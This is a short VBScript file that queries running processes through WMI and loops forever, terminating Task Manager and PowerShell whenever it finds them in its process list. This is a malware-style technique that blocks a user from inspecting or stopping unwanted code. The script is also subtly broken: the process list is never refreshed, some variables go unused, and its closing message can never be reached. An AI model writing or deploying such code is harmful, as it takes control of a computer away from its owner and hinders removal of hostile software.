'Option Explicit
Dim a,b,c,obj

Dim objWMIService : Set objWMIService = GetObject("winmgmts:")
Dim processlist,process


Set processlist =  objWMIService.ExecQuery _ 
("Select * from Win32_Process")
Set obj=CreateObject("wscript.shell")
set b= CreateObject("Shell.Application")



Do
For Each process in processlist
if process.name = "Taskmgr.exe" Then
process.terminate()
End If
if process.name = "powershell.exe" Then
process.terminate()
End if
Next
Loop
MsgBOx "DONE"

